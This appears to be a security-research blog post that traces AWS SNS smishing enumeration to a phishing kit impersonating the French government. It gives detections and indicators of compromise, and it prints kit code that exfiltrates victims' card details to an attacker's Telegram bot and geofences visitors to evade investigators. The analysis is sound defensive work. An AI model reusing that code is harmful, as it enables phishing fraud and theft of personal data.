@@ -1,0 +1,253 @@
+# Tales from the cloud trenches: Using AWS CloudTrail to identify malicious activity and spot phishing campaigns
+
+- aws
+- threat detection
+
+In this post, we explore how the tracking of AWS Simple Notification Service (SNS) enumeration activity across multiple customer environments led to the takedown of a phishing site that was impersonating the French government.
+
+## Key points and observations
+
+- We observed likely malicious activity enumerating an AWS victim’s SMS sending capabilities via the `GetSMSAttributes` command.
+- The IP address `134[.]209.127.249` was running the `GetSMSAttributes` API call across multiple regions, in a short period of time. At this time, these attempts have failed.
+- Upon further investigation of the IP address, we were able to determine that it was running a phishing campaign impersonating the French government and had successfully phished user PII and credit card information. We confirmed this through a world-readable text file that had been left on the web server.
+- With further research, we were able to identify similar phishing sites impersonating the French government.
+- We assess with high confidence that attackers in this cluster configure phishing sites and perform smishing campaigns with victim AWS accounts from the same host.
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/campaign-overview.png?auto=format&w=800&dpr=1.75]
+
+## Attacker activity: AWS SNS enumeration via stolen access keys
+
+We observed an attacker attempting and failing to enumerate the settings for sending SMS messages (`GetSMSAttributes`) in 10 AWS regions over a period of five minutes, which we caught using one of our out-of-the-box detections. This attacker behavior is a common enumeration technique, as we have covered in a previous post.
+
+> The attacker has compromised credentials, but they don't know where they’ve landed in the breached environment. Their goal is to gain situational awareness and understand the value and potential of the compromised account.
+
+The likely purpose of this activity is smishing (phishing via SMS messages). Spammers regularly abuse stolen cloud and SaaS application keys that can provide texting-as-a-service, which offers a convenient way to distribute the SMS spam and phishing, and carriers typically trust these apps.
+Attackers with the correct permissions will enumerate SMS settings with `GetSMSAttributes` or `GetSMSSandboxAccountStatus` and then use the AWS SNS API call `Publish` to send out SMS messages with their phishing links.
+Several publicly available threat actor toolsets abuse services like Twilio and Amazon SNS, attackers will then advertise on platforms like Telegram for individuals or groups interested in SMS spam or smishing. This is also reinforced by our internal data with AWS SNS being one of the services that attackers target most frequently.
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-1.png?auto=format&w=600&dpr=1.75]
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/smishing-toolsets-2.png?auto=format&w=600&dpr=1.75]
+
+### Cloudtrail API calls
+
+The following table shows some of the relevant Cloudtrail API calls we have seen related to smishing attacks. It is worth noting `sns:Publish` is a data plane event and may need configured separately.
+
++--------------------------------+------------------------------------------------------+
+| CloudTrail event               | Threat Perspective                                   |
++================================+======================================================+
+| ```                            | "What's the SMS monthly spend limit?"                |
+| sns:GetSMSAttributes           |                                                      |
+| ```                            |                                                      |
++--------------------------------+------------------------------------------------------+
+| ```                            | "What are the credentials I compromised?"            |
+| sts:GetCallerIdentity          |                                                      |
+| ```                            |                                                      |
++--------------------------------+------------------------------------------------------+
+| ```                            | "Is the account in a sandbox and therefore limited?" |
+| sns:GetSMSSandboxAccountStatus |                                                      |
+| ```                            |                                                      |
++--------------------------------+------------------------------------------------------+
+| ```                            | "Send an SMS message"                                |
+| sns:Publish                    |                                                      |
+| ```                            |                                                      |
++--------------------------------+------------------------------------------------------+
+
+## Pivoting on IP addresses: Discovering a phishing campaign
+
+We discovered that one of the IPs targeting AWS SNS for smishing was also hosting a phishing page impersonating a French government website for the payment of fines.
+It appeared that the attacker was using the same infrastructure to host their phishing page and target AWS environments for the purpose of sending out phishing links via SMS.
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-user-details.png?auto=format&w=600&dpr=1.75]
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-cc-details.png?auto=format&w=600&dpr=1.75]
+
+Pivoting on the unique URL path `/app/pages/bill.php` using URLScan, we were able to find several other kits deployed over the last 11 months, across 20 domains.
+
+```
+dev-sergeffbon[.]pantheonsite[.]io
+service-valid-data[.]com
+payement[.]infraction-stationnement[.]com
+amd-reglefr[.]com
+service-routier[.]com
+servicebps-publique[.]com
+antai-telepaiment[.]com
+antaiapaiement[.]fr
+amendegouv-paiement[.]com
+dev-sergeffbon[.]pantheonsite[.]io
+je-reglemoninfraction[.]info
+majoration-redirect[.]sytes[.]net
+www[.]avis-impayer[.]info
+dev-ghestyauth[.]pantheonsite[.]io
+antai-gouv[.]do
+service-amande[.]fr
+www[.]amende-paiements-gouv[.]com
+cf54754[.]tw1[.]ru
+amendesgouvfr-paiment[.]info
+www[.]assistance-verification[.]eu
+```
+
+During the investigation, we discovered an open directory on the web server, allowing us to confirm that three users had submitted their details to the phishing site.
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-open-directory.png?auto=format&w=600&dpr=1.75]
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-server-directory.png?auto=format&w=600&dpr=1.75]
+
+### Phishing kit analysis
+
+Armed with this additional information, we were able to hunt for the phishing kit on Virustotal and found four variations of this phishing kit attempting to impersonate the French government. Across these four kits, we counted only five unique user submissions of details (excluding entries that appeared to be tests or possible investigations).
+One of the notable things we observed was the use of Telegram to send users’ PII, credit card details, and other request metadata to an attacker-controlled channel. This function was found in the `/server/config.php` file, which also contained Telegram API tokens.
+
+```
+function sendMessage($message, $page) {
+    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
+    $chatid = $chatOther;
+
+    if($page == "vbv")
+    {
+        $chatid = $chatVBV;
+    }else if($page == "card")
+    {
+        $chatid = $chatCard;
+    }
+
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+```
+
+We analyzed the file `/server/ab.php` across each of the kits and determined that the file was intended to ensure the user was coming from a French network otherwise it would be redirected to a HTTP 404 not found or redirected to a legitimate French site. In addition, this data was also sent to Telegram along with the user’s PII and credit card information.
+As you can see there was a hardcoded IP address left in two of the files. This IP belongs to `Bouygues Telecom SA` in France. It’s possible that this IP was left over from an attacker testing their phishing kit before deploying it.
+
+```
+<SNIPPET>
+if($test_mode){
+$ip = "128[.]78.14.206";
+
+}
+else{
+$ip = $_SERVER['REMOTE_ADDR'];
+}
+<SNIPPET>
+/*if($country == "France" || $visitor_ip == "127.0.0.1")
+{*/
+    if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $visitor_ip == "127.0.0.1") {
+
+    }else{
+        die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country);
+    }
+/*}else{
+    die('HTTP/1.0 404 Not Found - ' . $country);
+}*/
+```
+
+```
+if ($response) {
+        // Analysez la réponse JSON
+        $data = json_decode($response, true);
+
+        // Vérifiez si l'IP est en France
+        $pays = $data['country'] ?? '';
+        if (strtolower($pays) == 'france') {
+            header("Location: https://www.mediapart.fr/");
+            exit;
+        }
+```
+
+Finally, we determined that the attacker is able to monitor the phishing site—including the number of visitors, billing, and credit card information—under the `/panel` directory of the phishing kit.
+
+[Image Info:
+https://datadog-securitylabs.imgix.net/img/tales-from-the-cloud-trenches-aws-activity-to-phishing/phishing-site-statistics.png?auto=format&w=600&dpr=1.75]
+
+## Detection opportunities
+
+From an AWS perspective the attacker was targeting the SNS service with a long-term access key beginning with `AKIA`. There are various opportunities for detection of this activity, depending on your organization’s usage of the SNS service:
+
+- Monitor API calls for `GetSMSAttributes` or `GetSMSSandboxAccountStatus`. To increase the fidelity of this detection, you can filter for a long term access key, attempts across multiple regions in a short period of time, or suspicious IP addresses identified through threat intelligence.
+- Monitor usage and spikes in cloud costs. Spiking costs in SMS spending could be a possible indicator of malicious activity. AWS provides guidance on how to set up an alarm in CloudWatch.
+
+## How Datadog can help
+
+Datadog Cloud SIEM and Cloud Security Management (CSM) comes with the following out-of-the-box rules to identify suspicious activity relevant to these attacks in an AWS environment. The Cloud SIEM rules help identify potential threats against the AWS SNS service, while the CSM rules help identify long-lived or stale access keys. Long-lived access keys tend to carry a higher risk of being associated with a compromise.
+
+- Amazon SNS enumeration attempt by previously unseen user
+- Amazon SNS enumeration in multiple regions using a long-term access key
+- Access keys should be rotated every 90 days or less
+- Inactive IAM access keys older than 1 year should be removed
+
+## Conclusion
+
+In response to this activity we contacted the hosting provider to take down the server and notified the Computer Emergency Response Team (CERT) within French law enforcement. The hosting provider has since removed the server. This was an interesting case, as we have previously never seen an attacker reuse the same infrastructure to host their phishing site and target AWS to distribute their phishing attempt via SNS.
+
+## Indicators of compromise
+
++------------------------------------------------------------------+--------------------------------+
+| Indicator                                                        | Type                           |
++==================================================================+================================+
+| 3a2ef352bf4d15a9ca355ed127bbb888adeebd5536509fe75716fa3876b89544 | Phishing kit zip file - SHA256 |
++------------------------------------------------------------------+--------------------------------+
+| 2ec288eebbc567a1894255525e96b47517b0d8df5929fb9654af1556875dc1bf | Phishing kit zip file - SHA256 |
++------------------------------------------------------------------+--------------------------------+
+| 03f595e280253cc99cda230d2709cefce97b32fa981fa51f7290223e3a9ca516 | Phishing kit zip file - SHA256 |
++------------------------------------------------------------------+--------------------------------+
+| E37ff64c05493fe5c5350b13487db1b6ef72721faf9e522faae85aeec90b4842 | Phishing kit zip file - SHA256 |
++------------------------------------------------------------------+--------------------------------+
+| 134[.]209.127.249                                                | IP address                     |
++------------------------------------------------------------------+--------------------------------+
+| 64[.]23.212.130                                                  | IP address                     |
++------------------------------------------------------------------+--------------------------------+
+| dev-sergeffbon[.]pantheonsite[.]io                               | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| service-valid-data[.]com                                         | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| payement[.]infraction-stationnement[.]com                        | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| amd-reglefr[.]com                                                | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| service-routier[.]com                                            | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| servicebps-publique[.]com                                        | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| antai-telepaiment[.]com                                          | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| antaiapaiement[.]fr                                              | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| amendegouv-paiement[.]com                                        | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| dev-sergeffbon[.]pantheonsite[.]io                               | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| je-reglemoninfraction[.]info                                     | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| majoration-redirect[.]sytes[.]net                                | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| www[.]avis-impayer[.]info                                        | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| dev-ghestyauth[.]pantheonsite[.]io                               | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| antai-gouv[.]do                                                  | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| service-amande[.]fr                                              | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| www[.]amende-paiements-gouv[.]com                                | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| cf54754[.]tw1[.]ru                                               | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| amendesgouvfr-paiment[.]info                                     | Domain                         |
++------------------------------------------------------------------+--------------------------------+
+| www[.]assistance-verification[.]eu                               | Domain                         |
++------------------------------------------------------------------+--------------------------------+
